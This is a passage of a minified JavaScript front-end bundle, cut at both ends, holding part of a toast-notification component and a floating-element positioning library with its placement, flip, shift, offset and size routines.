                                      T.current && (T.current.focus({ preventScroll: !0 }), (T.current = null)));
                              },
                              onFocus: (te) => {
                                  (te.target instanceof HTMLElement && te.target.dataset.dismissible === "false") ||
                                      _.current ||
                                      ((_.current = !0), (T.current = te.relatedTarget));
                              },
                              onMouseEnter: () => F(!0),
                              onMouseMove: () => F(!0),
                              onMouseLeave: () => {
                                  G || F(!1);
                              },
                              onDragEnd: () => F(!1),
                              onPointerDown: (te) => {
                                  (te.target instanceof HTMLElement && te.target.dataset.dismissible === "false") ||
                                      O(!0);
                              },
                              onPointerUp: () => O(!1),
                          },
                          C.filter((te) => (!te.position && q === 0) || te.position === B).map((te, Zt) => {
                              var Ot, Jt;
                              return R.createElement(Vw, {
                                  key: te.id,
                                  icons: v,
                                  index: Zt,
                                  toast: te,
                                  defaultRichColors: p,
                                  duration: (Ot = y == null ? void 0 : y.duration) != null ? Ot : m,
                                  className: y == null ? void 0 : y.className,
                                  descriptionClassName: y == null ? void 0 : y.descriptionClassName,
                                  invert: n,
                                  visibleToasts: S,
                                  closeButton: (Jt = y == null ? void 0 : y.closeButton) != null ? Jt : s,
                                  interacting: G,
                                  position: B,
                                  style: y == null ? void 0 : y.style,
                                  unstyled: y == null ? void 0 : y.unstyled,
                                  classNames: y == null ? void 0 : y.classNames,
                                  cancelButtonStyle: y == null ? void 0 : y.cancelButtonStyle,
                                  actionButtonStyle: y == null ? void 0 : y.actionButtonStyle,
                                  removeToast: V,
                                  toasts: C.filter((re) => re.position == te.position),
                                  heights: L.filter((re) => re.position == te.position),
                                  setHeights: M,
                                  expandByDefault: i,
                                  gap: g,
                                  loadingIcon: h,
                                  expanded: U,
                                  pauseWhenPageIsHidden: k,
                                  swipeDirections: e.swipeDirections,
                              });
                          })
                      )
                    : null;
            })
        )
    );
});
const Gw = ({ ...e }) => {
        const { theme: t = "system" } = xw();
        return l.jsx(Kw, {
            theme: t,
            className: "toaster group",
            toastOptions: {
                classNames: {
                    toast: "group toast group-[.toaster]:bg-background group-[.toaster]:text-foreground group-[.toaster]:border-border group-[.toaster]:shadow-lg",
                    description: "group-[.toast]:text-muted-foreground",
                    actionButton: "group-[.toast]:bg-primary group-[.toast]:text-primary-foreground",
                    cancelButton: "group-[.toast]:bg-muted group-[.toast]:text-muted-foreground",
                },
            },
            ...e,
        });
    },
    Qw = ["top", "right", "bottom", "left"],
    rr = Math.min,
    rt = Math.max,
    ca = Math.round,
    ms = Math.floor,
    qt = (e) => ({ x: e, y: e }),
    qw = { left: "right", right: "left", bottom: "top", top: "bottom" },
    Xw = { start: "end", end: "start" };
function Dc(e, t, n) {
    return rt(e, rr(t, n));
}
function vn(e, t) {
    return typeof e == "function" ? e(t) : e;
}
function xn(e) {
    return e.split("-")[0];
}
function jo(e) {
    return e.split("-")[1];
}
function qu(e) {
    return e === "x" ? "y" : "x";
}
function Xu(e) {
    return e === "y" ? "height" : "width";
}
const Yw = new Set(["top", "bottom"]);
function Kt(e) {
    return Yw.has(xn(e)) ? "y" : "x";
}
function Yu(e) {
    return qu(Kt(e));
}
function Zw(e, t, n) {
    n === void 0 && (n = !1);
    const r = jo(e),
        o = Yu(e),
        i = Xu(o);
    let s = o === "x" ? (r === (n ? "end" : "start") ? "right" : "left") : r === "start" ? "bottom" : "top";
    return t.reference[i] > t.floating[i] && (s = ua(s)), [s, ua(s)];
}
function Jw(e) {
    const t = ua(e);
    return [Oc(e), t, Oc(t)];
}
function Oc(e) {
    return e.replace(/start|end/g, (t) => Xw[t]);
}
const Fp = ["left", "right"],
    zp = ["right", "left"],
    e2 = ["top", "bottom"],
    t2 = ["bottom", "top"];
function n2(e, t, n) {
    switch (e) {
        case "top":
        case "bottom":
            return n ? (t ? zp : Fp) : t ? Fp : zp;
        case "left":
        case "right":
            return t ? e2 : t2;
        default:
            return [];
    }
}
function r2(e, t, n, r) {
    const o = jo(e);
    let i = n2(xn(e), n === "start", r);
    return o && ((i = i.map((s) => s + "-" + o)), t && (i = i.concat(i.map(Oc)))), i;
}
function ua(e) {
    return e.replace(/left|right|bottom|top/g, (t) => qw[t]);
}
function o2(e) {
    return { top: 0, right: 0, bottom: 0, left: 0, ...e };
}
function Dg(e) {
    return typeof e != "number" ? o2(e) : { top: e, right: e, bottom: e, left: e };
}
function da(e) {
    const { x: t, y: n, width: r, height: o } = e;
    return { width: r, height: o, top: n, left: t, right: t + r, bottom: n + o, x: t, y: n };
}
function Bp(e, t, n) {
    let { reference: r, floating: o } = e;
    const i = Kt(t),
        s = Yu(t),
        a = Xu(s),
        c = xn(t),
        u = i === "y",
        d = r.x + r.width / 2 - o.width / 2,
        p = r.y + r.height / 2 - o.height / 2,
        m = r[a] / 2 - o[a] / 2;
    let f;
    switch (c) {
        case "top":
            f = { x: d, y: r.y - o.height };
            break;
        case "bottom":
            f = { x: d, y: r.y + r.height };
            break;
        case "right":
            f = { x: r.x + r.width, y: p };
            break;
        case "left":
            f = { x: r.x - o.width, y: p };
            break;
        default:
            f = { x: r.x, y: r.y };
    }
    switch (jo(t)) {
        case "start":
            f[s] -= m * (n && u ? -1 : 1);
            break;
        case "end":
            f[s] += m * (n && u ? -1 : 1);
            break;
    }
    return f;
}
const i2 = async (e, t, n) => {
    const { placement: r = "bottom", strategy: o = "absolute", middleware: i = [], platform: s } = n,
        a = i.filter(Boolean),
        c = await (s.isRTL == null ? void 0 : s.isRTL(t));
    let u = await s.getElementRects({ reference: e, floating: t, strategy: o }),
        { x: d, y: p } = Bp(u, r, c),
        m = r,
        f = {},
        S = 0;
    for (let y = 0; y < a.length; y++) {
        const { name: w, fn: g } = a[y],
            {
                x: h,
                y: v,
                data: b,
                reset: k,
            } = await g({
                x: d,
                y: p,
                initialPlacement: r,
                placement: m,
                strategy: o,
                middlewareData: f,
                rects: u,
                platform: s,
                elements: { reference: e, floating: t },
            });
        (d = h ?? d),
            (p = v ?? p),
            (f = { ...f, [w]: { ...f[w], ...b } }),
            k &&
                S <= 50 &&
                (S++,
                typeof k == "object" &&
                    (k.placement && (m = k.placement),
                    k.rects &&
                        (u =
                            k.rects === !0
                                ? await s.getElementRects({ reference: e, floating: t, strategy: o })
                                : k.rects),
                    ({ x: d, y: p } = Bp(u, m, c))),
                (y = -1));
    }
    return { x: d, y: p, placement: m, strategy: o, middlewareData: f };
};
async function Ci(e, t) {
    var n;
    t === void 0 && (t = {});
    const { x: r, y: o, platform: i, rects: s, elements: a, strategy: c } = e,
        {
            boundary: u = "clippingAncestors",
            rootBoundary: d = "viewport",
            elementContext: p = "floating",
            altBoundary: m = !1,
            padding: f = 0,
        } = vn(t, e),
        S = Dg(f),
        w = a[m ? (p === "floating" ? "reference" : "floating") : p],
        g = da(
            await i.getClippingRect({
                element:
                    (n = await (i.isElement == null ? void 0 : i.isElement(w))) == null || n
                        ? w
                        : w.contextElement ||
                          (await (i.getDocumentElement == null ? void 0 : i.getDocumentElement(a.floating))),
                boundary: u,
                rootBoundary: d,
                strategy: c,
            })
        ),
        h = p === "floating" ? { x: r, y: o, width: s.floating.width, height: s.floating.height } : s.reference,
        v = await (i.getOffsetParent == null ? void 0 : i.getOffsetParent(a.floating)),
        b = (await (i.isElement == null ? void 0 : i.isElement(v)))
            ? (await (i.getScale == null ? void 0 : i.getScale(v))) || { x: 1, y: 1 }
            : { x: 1, y: 1 },
        k = da(
            i.convertOffsetParentRelativeRectToViewportRelativeRect
                ? await i.convertOffsetParentRelativeRectToViewportRelativeRect({
                      elements: a,
                      rect: h,
                      offsetParent: v,
                      strategy: c,
                  })
                : h
        );
    return {
        top: (g.top - k.top + S.top) / b.y,
        bottom: (k.bottom - g.bottom + S.bottom) / b.y,
        left: (g.left - k.left + S.left) / b.x,
        right: (k.right - g.right + S.right) / b.x,
    };
}
const s2 = (e) => ({
        name: "arrow",
        options: e,
        async fn(t) {
            const { x: n, y: r, placement: o, rects: i, platform: s, elements: a, middlewareData: c } = t,
                { element: u, padding: d = 0 } = vn(e, t) || {};
            if (u == null) return {};
            const p = Dg(d),
                m = { x: n, y: r },
                f = Yu(o),
                S = Xu(f),
                y = await s.getDimensions(u),
                w = f === "y",
                g = w ? "top" : "left",
                h = w ? "bottom" : "right",
                v = w ? "clientHeight" : "clientWidth",
                b = i.reference[S] + i.reference[f] - m[f] - i.floating[S],
                k = m[f] - i.reference[f],
                C = await (s.getOffsetParent == null ? void 0 : s.getOffsetParent(u));
            let P = C ? C[v] : 0;
            (!P || !(await (s.isElement == null ? void 0 : s.isElement(C)))) && (P = a.floating[v] || i.floating[S]);
            const A = b / 2 - k / 2,
                L = P / 2 - y[S] / 2 - 1,
                M = rr(p[g], L),
                U = rr(p[h], L),
                F = M,
                G = P - y[S] - U,
                O = P / 2 - y[S] / 2 + A,
                X = Dc(F, O, G),
                H = !c.arrow && jo(o) != null && O !== X && i.reference[S] / 2 - (O < F ? M : U) - y[S] / 2 < 0,
                $ = H ? (O < F ? O - F : O - G) : 0;
            return {
                [f]: m[f] + $,
                data: { [f]: X, centerOffset: O - X - $, ...(H && { alignmentOffset: $ }) },
                reset: H,
            };
        },
    }),
    a2 = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                name: "flip",
                options: e,
                async fn(t) {
                    var n, r;
                    const {
                            placement: o,
                            middlewareData: i,
                            rects: s,
                            initialPlacement: a,
                            platform: c,
                            elements: u,
                        } = t,
                        {
                            mainAxis: d = !0,
                            crossAxis: p = !0,
                            fallbackPlacements: m,
                            fallbackStrategy: f = "bestFit",
                            fallbackAxisSideDirection: S = "none",
                            flipAlignment: y = !0,
                            ...w
                        } = vn(e, t);
                    if ((n = i.arrow) != null && n.alignmentOffset) return {};
                    const g = xn(o),
                        h = Kt(a),
                        v = xn(a) === a,
                        b = await (c.isRTL == null ? void 0 : c.isRTL(u.floating)),
                        k = m || (v || !y ? [ua(a)] : Jw(a)),
                        C = S !== "none";
                    !m && C && k.push(...r2(a, y, S, b));
                    const P = [a, ...k],
                        A = await Ci(t, w),
                        L = [];
                    let M = ((r = i.flip) == null ? void 0 : r.overflows) || [];
                    if ((d && L.push(A[g]), p)) {
                        const O = Zw(o, s, b);
                        L.push(A[O[0]], A[O[1]]);
                    }
                    if (((M = [...M, { placement: o, overflows: L }]), !L.every((O) => O <= 0))) {
                        var U, F;
                        const O = (((U = i.flip) == null ? void 0 : U.index) || 0) + 1,
                            X = P[O];
                        if (
                            X &&
                            (!(p === "alignment" ? h !== Kt(X) : !1) ||
                                M.every((E) => E.overflows[0] > 0 && Kt(E.placement) === h))
                        )
                            return { data: { index: O, overflows: M }, reset: { placement: X } };
                        let H =
                            (F = M.filter(($) => $.overflows[0] <= 0).sort(
                                ($, E) => $.overflows[1] - E.overflows[1]
                            )[0]) == null
                                ? void 0
                                : F.placement;
                        if (!H)
                            switch (f) {
                                case "bestFit": {
                                    var G;
                                    const $ =
                                        (G = M.filter((E) => {
                                            if (C) {
                                                const T = Kt(E.placement);
                                                return T === h || T === "y";
                                            }
                                            return !0;
                                        })
                                            .map((E) => [
                                                E.placement,
                                                E.overflows.filter((T) => T > 0).reduce((T, _) => T + _, 0),
                                            ])
                                            .sort((E, T) => E[1] - T[1])[0]) == null
                                            ? void 0
                                            : G[0];
                                    $ && (H = $);
                                    break;
                                }
                                case "initialPlacement":
                                    H = a;
                                    break;
                            }
                        if (o !== H) return { reset: { placement: H } };
                    }
                    return {};
                },
            }
        );
    };
function Up(e, t) {
    return { top: e.top - t.height, right: e.right - t.width, bottom: e.bottom - t.height, left: e.left - t.width };
}
function Hp(e) {
    return Qw.some((t) => e[t] >= 0);
}
const l2 = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                name: "hide",
                options: e,
                async fn(t) {
                    const { rects: n } = t,
                        { strategy: r = "referenceHidden", ...o } = vn(e, t);
                    switch (r) {
                        case "referenceHidden": {
                            const i = await Ci(t, { ...o, elementContext: "reference" }),
                                s = Up(i, n.reference);
                            return { data: { referenceHiddenOffsets: s, referenceHidden: Hp(s) } };
                        }
                        case "escaped": {
                            const i = await Ci(t, { ...o, altBoundary: !0 }),
                                s = Up(i, n.floating);
                            return { data: { escapedOffsets: s, escaped: Hp(s) } };
                        }
                        default:
                            return {};
                    }
                },
            }
        );
    },
    Og = new Set(["left", "top"]);
async function c2(e, t) {
    const { placement: n, platform: r, elements: o } = e,
        i = await (r.isRTL == null ? void 0 : r.isRTL(o.floating)),
        s = xn(n),
        a = jo(n),
        c = Kt(n) === "y",
        u = Og.has(s) ? -1 : 1,
        d = i && c ? -1 : 1,
        p = vn(t, e);
    let {
        mainAxis: m,
        crossAxis: f,
        alignmentAxis: S,
    } = typeof p == "number"
        ? { mainAxis: p, crossAxis: 0, alignmentAxis: null }
        : { mainAxis: p.mainAxis || 0, crossAxis: p.crossAxis || 0, alignmentAxis: p.alignmentAxis };
    return (
        a && typeof S == "number" && (f = a === "end" ? S * -1 : S), c ? { x: f * d, y: m * u } : { x: m * u, y: f * d }
    );
}
const u2 = function (e) {
        return (
            e === void 0 && (e = 0),
            {
                name: "offset",
                options: e,
                async fn(t) {
                    var n, r;
                    const { x: o, y: i, placement: s, middlewareData: a } = t,
                        c = await c2(t, e);
                    return s === ((n = a.offset) == null ? void 0 : n.placement) &&
                        (r = a.arrow) != null &&
                        r.alignmentOffset
                        ? {}
                        : { x: o + c.x, y: i + c.y, data: { ...c, placement: s } };
                },
            }
        );
    },
    d2 = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                name: "shift",
                options: e,
                async fn(t) {
                    const { x: n, y: r, placement: o } = t,
                        {
                            mainAxis: i = !0,
                            crossAxis: s = !1,
                            limiter: a = {
                                fn: (w) => {
                                    let { x: g, y: h } = w;
                                    return { x: g, y: h };
                                },
                            },
                            ...c
                        } = vn(e, t),
                        u = { x: n, y: r },
                        d = await Ci(t, c),
                        p = Kt(xn(o)),
                        m = qu(p);
                    let f = u[m],
                        S = u[p];
                    if (i) {
                        const w = m === "y" ? "top" : "left",
                            g = m === "y" ? "bottom" : "right",
                            h = f + d[w],
                            v = f - d[g];
                        f = Dc(h, f, v);
                    }
                    if (s) {
                        const w = p === "y" ? "top" : "left",
                            g = p === "y" ? "bottom" : "right",
                            h = S + d[w],
                            v = S - d[g];
                        S = Dc(h, S, v);
                    }
                    const y = a.fn({ ...t, [m]: f, [p]: S });
                    return { ...y, data: { x: y.x - n, y: y.y - r, enabled: { [m]: i, [p]: s } } };
                },
            }
        );
    },
    p2 = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                options: e,
                fn(t) {
                    const { x: n, y: r, placement: o, rects: i, middlewareData: s } = t,
                        { offset: a = 0, mainAxis: c = !0, crossAxis: u = !0 } = vn(e, t),
                        d = { x: n, y: r },
                        p = Kt(o),
                        m = qu(p);
                    let f = d[m],
                        S = d[p];
                    const y = vn(a, t),
                        w = typeof y == "number" ? { mainAxis: y, crossAxis: 0 } : { mainAxis: 0, crossAxis: 0, ...y };
                    if (c) {
                        const v = m === "y" ? "height" : "width",
                            b = i.reference[m] - i.floating[v] + w.mainAxis,
                            k = i.reference[m] + i.reference[v] - w.mainAxis;
                        f < b ? (f = b) : f > k && (f = k);
                    }
                    if (u) {
                        var g, h;
                        const v = m === "y" ? "width" : "height",
                            b = Og.has(xn(o)),
                            k =
                                i.reference[p] -
                                i.floating[v] +
                                ((b && ((g = s.offset) == null ? void 0 : g[p])) || 0) +
                                (b ? 0 : w.crossAxis),
                            C =
                                i.reference[p] +
                                i.reference[v] +
                                (b ? 0 : ((h = s.offset) == null ? void 0 : h[p]) || 0) -
                                (b ? w.crossAxis : 0);
                        S < k ? (S = k) : S > C && (S = C);
                    }
                    return { [m]: f, [p]: S };
                },
            }
        );
    },
    f2 = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                name: "size",
                options: e,
                async fn(t) {
                    var n, r;
                    const { placement: o, rects: i, platform: s, elements: a } = t,
                        { apply: c = () => {}, ...u } = vn(e, t),
                        d = await Ci(t, u),
                        p = xn(o),
                        m = jo(o),
                        f = Kt(o) === "y",
                        { width: S, height: y } = i.floating;
                    let w, g;
                    p === "top" || p === "bottom"
                        ? ((w = p),
                          (g =
                              m === ((await (s.isRTL == null ? void 0 : s.isRTL(a.floating))) ? "start" : "end")
                                  ? "left"
                                  : "right"))
                        : ((g = p), (w = m === "end" ? "top" : "bottom"));
                    const h = y - d.top - d.bottom,
                        v = S - d.left - d.right,
                        b = rr(y - d[w], h),
                        k = rr(S - d[g], v),
                        C = !t.middlewareData.shift;
                    let P = b,
                        A = k;
                    if (
                        ((n = t.middlewareData.shift) != null && n.enabled.x && (A = v),
                        (r = t.middlewareData.shift) != null && r.enabled.y && (P = h),
                        C && !m)
                    ) {
                        const M = rt(d.left, 0),
                            U = rt(d.right, 0),
                            F = rt(d.top, 0),
                            G = rt(d.bottom, 0);
                        f
                            ? (A = S - 2 * (M !== 0 || U !== 0 ? M + U : rt(d.left, d.right)))
                            : (P = y - 2 * (F !== 0 || G !== 0 ? F + G : rt(d.top, d.bottom)));
                    }
                    await c({ ...t, availableWidth: A, availableHeight: P });
                    const L = await s.getDimensions(a.floating);
                    return S !== L.width || y !== L.height ? { reset: { rects: !0 } } : {};
                },
            }
        );
    };
function Oa() {
    return typeof window < "u";
}
function Ro(e) {
    return _g(e) ? (e.nodeName || "").toLowerCase() : "#document";
}
function st(e) {
    var t;
    return (e == null || (t = e.ownerDocument) == null ? void 0 : t.defaultView) || window;
}
function Yt(e) {
    var t;
    return (t = (_g(e) ? e.ownerDocument : e.document) || window.document) == null ? void 0 : t.documentElement;
}
function _g(e) {
    return Oa() ? e instanceof Node || e instanceof st(e).Node : !1;
}
function Lt(e) {
    return Oa() ? e instanceof Element || e instanceof st(e).Element : !1;
}
function Xt(e) {
    return Oa() ? e instanceof HTMLElement || e instanceof st(e).HTMLElement : !1;
}
function $p(e) {
    return !Oa() || typeof ShadowRoot > "u" ? !1 : e instanceof ShadowRoot || e instanceof st(e).ShadowRoot;
}
const m2 = new Set(["inline", "contents"]);
function Bi(e) {
    const { overflow: t, overflowX: n, overflowY: r, display: o } = Dt(e);
    return /auto|scroll|overlay|hidden|clip/.test(t + r + n) && !m2.has(o);
}
const h2 = new Set(["table", "td", "th"]);
function g2(e) {
    return h2.has(Ro(e));
}
const y2 = [":popover-open", ":modal"];
function _a(e) {
    return y2.some((t) => {
        try {
            return e.matches(t);
        } catch {
            return !1;
        }
    });
}
const v2 = ["transform", "translate", "scale", "rotate", "perspective"],
    x2 = ["transform", "translate", "scale", "rotate", "perspective", "filter"],
    w2 = ["paint", "layout", "strict", "content"];
function Zu(e) {
    const t = Ju(),
        n = Lt(e) ? Dt(e) : e;
    return (
        v2.some((r) => (n[r] ? n[r] !== "none" : !1)) ||
        (n.containerType ? n.containerType !== "normal" : !1) ||
        (!t && (n.backdropFilter ? n.backdropFilter !== "none" : !1)) ||
        (!t && (n.filter ? n.filter !== "none" : !1)) ||
        x2.some((r) => (n.willChange || "").includes(r)) ||
        w2.some((r) => (n.contain || "").includes(r))
    );
}
function S2(e) {
    let t = or(e);
    for (; Xt(t) && !Co(t); ) {
        if (Zu(t)) return t;
        if (_a(t)) return null;
        t = or(t);
    }
    return null;
}
function Ju() {
    return typeof CSS > "u" || !CSS.supports ? !1 : CSS.supports("-webkit-backdrop-filter", "none");
}
const b2 = new Set(["html", "body", "#document"]);
function Co(e) {
    return b2.has(Ro(e));
}
function Dt(e) {
    return st(e).getComputedStyle(e);
}
function Fa(e) {
    return Lt(e)
        ? { scrollLeft: e.scrollLeft, scrollTop: e.scrollTop }
        : { scrollLeft: e.scrollX, scrollTop: e.scrollY };
}
function or(e) {
    if (Ro(e) === "html") return e;
    const t = e.assignedSlot || e.parentNode || ($p(e) && e.host) || Yt(e);
    return $p(t) ? t.host : t;
}
function Fg(e) {
    const t = or(e);
    return Co(t) ? (e.ownerDocument ? e.ownerDocument.body : e.body) : Xt(t) && Bi(t) ? t : Fg(t);
}
function Pi(e, t, n) {
    var r;
    t === void 0 && (t = []), n === void 0 && (n = !0);
    const o = Fg(e),
        i = o === ((r = e.ownerDocument) == null ? void 0 : r.body),
        s = st(o);
    if (i) {
        const a = _c(s);
        return t.concat(s, s.visualViewport || [], Bi(o) ? o : [], a && n ? Pi(a) : []);
    }
    return t.concat(o, Pi(o, [], n));
}
function _c(e) {
    return e.parent && Object.getPrototypeOf(e.parent) ? e.frameElement : null;
}
function zg(e) {
    const t = Dt(e);
    let n = parseFloat(t.width) || 0,
        r = parseFloat(t.height) || 0;
    const o = Xt(e),
        i = o ? e.offsetWidth : n,
        s = o ? e.offsetHeight : r,
        a = ca(n) !== i || ca(r) !== s;
    return a && ((n = i), (r = s)), { width: n, height: r, $: a };
}
function ed(e) {
    return Lt(e) ? e : e.contextElement;
}
function ao(e) {
    const t = ed(e);
    if (!Xt(t)) return qt(1);
    const n = t.getBoundingClientRect(),
        { width: r, height: o, $: i } = zg(t);
    let s = (i ? ca(n.width) : n.width) / r,
        a = (i ? ca(n.height) : n.height) / o;
    return (!s || !Number.isFinite(s)) && (s = 1), (!a || !Number.isFinite(a)) && (a = 1), { x: s, y: a };
}
const k2 = qt(0);
function Bg(e) {
    const t = st(e);
    return !Ju() || !t.visualViewport ? k2 : { x: t.visualViewport.offsetLeft, y: t.visualViewport.offsetTop };
}
function C2(e, t, n) {
    return t === void 0 && (t = !1), !n || (t && n !== st(e)) ? !1 : t;
}
function jr(e, t, n, r) {
    t === void 0 && (t = !1), n === void 0 && (n = !1);
    const o = e.getBoundingClientRect(),
        i = ed(e);
    let s = qt(1);
    t && (r ? Lt(r) && (s = ao(r)) : (s = ao(e)));
    const a = C2(i, n, r) ? Bg(i) : qt(0);
    let c = (o.left + a.x) / s.x,
        u = (o.top + a.y) / s.y,
        d = o.width / s.x,
        p = o.height / s.y;
    if (i) {
        const m = st(i),
            f = r && Lt(r) ? st(r) : r;
        let S = m,
            y = _c(S);
        for (; y && r && f !== S; ) {
            const w = ao(y),
                g = y.getBoundingClientRect(),
                h = Dt(y),
                v = g.left + (y.clientLeft + parseFloat(h.paddingLeft)) * w.x,
                b = g.top + (y.clientTop + parseFloat(h.paddingTop)) * w.y;
            (c *= w.x), (u *= w.y), (d *= w.x), (p *= w.y), (c += v), (u += b), (S = st(y)), (y = _c(S));
        }
    }
    return da({ width: d, height: p, x: c, y: u });
}
function td(e, t) {
    const n = Fa(e).scrollLeft;
    return t ? t.left + n : jr(Yt(e)).left + n;
}
function Ug(e, t, n) {
    n === void 0 && (n = !1);
    const r = e.getBoundingClientRect(),
        o = r.left + t.scrollLeft - (n ? 0 : td(e, r)),
        i = r.top + t.scrollTop;
    return { x: o, y: i };
}
function P2(e) {
    let { elements: t, rect: n, offsetParent: r, strategy: o } = e;
    const i = o === "fixed",
        s = Yt(r),
        a = t ? _a(t.floating) : !1;
    if (r === s || (a && i)) return n;
    let c = { scrollLeft: 0, scrollTop: 0 },
        u = qt(1);
    const d = qt(0),
        p = Xt(r);
    if ((p || (!p && !i)) && ((Ro(r) !== "body" || Bi(s)) && (c = Fa(r)), Xt(r))) {
        const f = jr(r);
        (u = ao(r)), (d.x = f.x + r.clientLeft), (d.y = f.y + r.clientTop);
    }
    const m = s && !p && !i ? Ug(s, c, !0) : qt(0);
    return {
        width: n.width * u.x,
        height: n.height * u.y,
        x: n.x * u.x - c.scrollLeft * u.x + d.x + m.x,
        y: n.y * u.y - c.scrollTop * u.y + d.y + m.y,
    };
}
function E2(e) {
    return Array.from(e.getClientRects());
}
function N2(e) {
    const t = Yt(e),
        n = Fa(e),
        r = e.ownerDocument.body,
        o = rt(t.scrollWidth, t.clientWidth, r.scrollWidth, r.clientWidth),
        i = rt(t.scrollHeight, t.clientHeight, r.scrollHeight, r.clientHeight);
    let s = -n.scrollLeft + td(e);
    const a = -n.scrollTop;
    return (
        Dt(r).direction === "rtl" && (s += rt(t.clientWidth, r.clientWidth) - o), { width: o, height: i, x: s, y: a }
    );
}
function T2(e, t) {
    const n = st(e),
        r = Yt(e),
        o = n.visualViewport;
    let i = r.clientWidth,
        s = r.clientHeight,
        a = 0,
        c = 0;
    if (o) {
        (i = o.width), (s = o.height);
        const u = Ju();
        (!u || (u && t === "fixed")) && ((a = o.offsetLeft), (c = o.offsetTop));
    }
    return { width: i, height: s, x: a, y: c };
}
const A2 = new Set(["absolute", "fixed"]);
function j2(e, t) {
    const n = jr(e, !0, t === "fixed"),
        r = n.top + e.clientTop,
        o = n.left + e.clientLeft,
        i = Xt(e) ? ao(e) : qt(1),
        s = e.clientWidth * i.x,
        a = e.clientHeight * i.y,
        c = o * i.x,
        u = r * i.y;
    return { width: s, height: a, x: c, y: u };
}
function Vp(e, t, n) {
    let r;
    if (t === "viewport") r = T2(e, n);
    else if (t === "document") r = N2(Yt(e));
    else if (Lt(t)) r = j2(t, n);
    else {
        const o = Bg(e);
        r = { x: t.x - o.x, y: t.y - o.y, width: t.width, height: t.height };
    }
    return da(r);
}
function Hg(e, t) {
    const n = or(e);
    return n === t || !Lt(n) || Co(n) ? !1 : Dt(n).position === "fixed" || Hg(n, t);
}
function R2(e, t) {
    const n = t.get(e);
    if (n) return n;
    let r = Pi(e, [], !1).filter((a) => Lt(a) && Ro(a) !== "body"),
        o = null;
    const i = Dt(e).position === "fixed";
    let s = i ? or(e) : e;
    for (; Lt(s) && !Co(s); ) {
        const a = Dt(s),
            c = Zu(s);
        !c && a.position === "fixed" && (o = null),
            (i ? !c && !o : (!c && a.position === "static" && !!o && A2.has(o.position)) || (Bi(s) && !c && Hg(e, s)))
                ? (r = r.filter((d) => d !== s))
                : (o = a),
            (s = or(s));
    }
    return t.set(e, r), r;
}
function M2(e) {
    let { element: t, boundary: n, rootBoundary: r, strategy: o } = e;
    const s = [...(n === "clippingAncestors" ? (_a(t) ? [] : R2(t, this._c)) : [].concat(n)), r],
        a = s[0],
        c = s.reduce(
            (u, d) => {
                const p = Vp(t, d, o);
                return (
                    (u.top = rt(p.top, u.top)),
                    (u.right = rr(p.right, u.right)),
                    (u.bottom = rr(p.bottom, u.bottom)),
                    (u.left = rt(p.left, u.left)),
                    u
                );
            },
            Vp(t, a, o)
        );
    return { width: c.right - c.left, height: c.bottom - c.top, x: c.left, y: c.top };
}
function I2(e) {
    const { width: t, height: n } = zg(e);
    return { width: t, height: n };
}
function L2(e, t, n) {
    const r = Xt(t),
        o = Yt(t),
        i = n === "fixed",
        s = jr(e, !0, i, t);
    let a = { scrollLeft: 0, scrollTop: 0 };
    const c = qt(0);
    function u() {
        c.x = td(o);
    }
    if (r || (!r && !i))
        if (((Ro(t) !== "body" || Bi(o)) && (a = Fa(t)), r)) {
            const f = jr(t, !0, i, t);
            (c.x = f.x + t.clientLeft), (c.y = f.y + t.clientTop);
        } else o && u();
    i && !r && o && u();
    const d = o && !r && !i ? Ug(o, a) : qt(0),
        p = s.left + a.scrollLeft - c.x - d.x,
        m = s.top + a.scrollTop - c.y - d.y;
    return { x: p, y: m, width: s.width, height: s.height };
}
function Nl(e) {
    return Dt(e).position === "static";
}
function Wp(e, t) {
    if (!Xt(e) || Dt(e).position === "fixed") return null;
    if (t) return t(e);
    let n = e.offsetParent;
    return Yt(e) === n && (n = n.ownerDocument.body), n;
}
function $g(e, t) {
    const n = st(e);
    if (_a(e)) return n;
    if (!Xt(e)) {
        let o = or(e);
        for (; o && !Co(o); ) {
            if (Lt(o) && !Nl(o)) return o;
            o = or(o);
        }
        return n;
    }
    let r = Wp(e, t);
    for (; r && g2(r) && Nl(r); ) r = Wp(r, t);
    return r && Co(r) && Nl(r) && !Zu(r) ? n : r || S2(e) || n;
}
const D2 = async function (e) {
    const t = this.getOffsetParent || $g,
        n = this.getDimensions,
        r = await n(e.floating);
    return {
        reference: L2(e.reference, await t(e.floating), e.strategy),
        floating: { x: 0, y: 0, width: r.width, height: r.height },
    };
};
function O2(e) {
    return Dt(e).direction === "rtl";
}
const _2 = {
    convertOffsetParentRelativeRectToViewportRelativeRect: P2,
    getDocumentElement: Yt,
    getClippingRect: M2,
    getOffsetParent: $g,
    getElementRects: D2,
    getClientRects: E2,
    getDimensions: I2,
    getScale: ao,
    isElement: Lt,
    isRTL: O2,
};
function Vg(e, t) {
    return e.x === t.x && e.y === t.y && e.width === t.width && e.height === t.height;
}
function F2(e, t) {
    let n = null,
        r;
    const o = Yt(e);
    function i() {
        var a;
        clearTimeout(r), (a = n) == null || a.disconnect(), (n = null);
    }
    function s(a, c) {
        a === void 0 && (a = !1), c === void 0 && (c = 1), i();
        const u = e.getBoundingClientRect(),
            { left: d, top: p, width: m, height: f } = u;
        if ((a || t(), !m || !f)) return;
        const S = ms(p),
            y = ms(o.clientWidth - (d + m)),
            w = ms(o.clientHeight - (p + f)),
            g = ms(d),
            v = { rootMargin: -S + "px " + -y + "px " + -w + "px " + -g + "px", threshold: rt(0, rr(1, c)) || 1 };
        let b = !0;
        function k(C) {
            const P = C[0].intersectionRatio;
            if (P !== c) {
                if (!b) return s();
                P
                    ? s(!1, P)
                    : (r = setTimeout(() => {
                          s(!1, 1e-7);
                      }, 1e3));
            }
            P === 1 && !Vg(u, e.getBoundingClientRect()) && s(), (b = !1);
        }
        try {
            n = new IntersectionObserver(k, { ...v, root: o.ownerDocument });
        } catch {
            n = new IntersectionObserver(k, v);
        }
        n.observe(e);
    }
    return s(!0), i;
}
function z2(e, t, n, r) {
    r === void 0 && (r = {});
    const {
            ancestorScroll: o = !0,
            ancestorResize: i = !0,
            elementResize: s = typeof ResizeObserver == "function",
            layoutShift: a = typeof IntersectionObserver == "function",
            animationFrame: c = !1,
        } = r,
        u = ed(e),
        d = o || i ? [...(u ? Pi(u) : []), ...Pi(t)] : [];
    d.forEach((g) => {
